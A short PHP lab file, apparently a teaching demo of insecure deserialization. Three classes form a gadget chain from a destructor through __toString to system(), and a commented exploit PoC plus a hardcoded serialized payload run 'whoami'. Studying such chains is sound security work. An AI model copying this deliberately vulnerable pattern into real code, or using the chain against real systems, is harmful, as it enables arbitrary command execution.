<?php
class foo1{
        public $varr;
        function __construct(){
                $this->varr = "index.php";
        }
        function __destruct(){
                echo "<br>文件".$this->varr."存在<br>";
        }
}
class foo2{
        public $varr;
        public $obj;
        function __construct(){
                $this->varr = '1234567890';
                $this->obj = null;
        }
        function __toString(){
                $this->obj->execute();
                return $this->varr;
        }
        function __desctuct(){
                echo "<br>这是foo2的析构函数<br>";
        }
}
class foo3{
        public $varr;
        function execute(){
                system($this->varr);
        }
        function __desctuct(){
                echo "<br>这是foo3的析构函数<br>";
        }
}
/*利用的poc
$foo3=new foo3;
$foo3->varr="whoami";
$foo2=new foo2;
$foo2->obj=$foo3;
$foo1=new foo1;
$foo1->varr=$foo2;
echo serialize($foo1);
*/
$foo1='O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:6:"whoami";}}}';
unserialize($foo1);
show_source(__FILE__);
?>
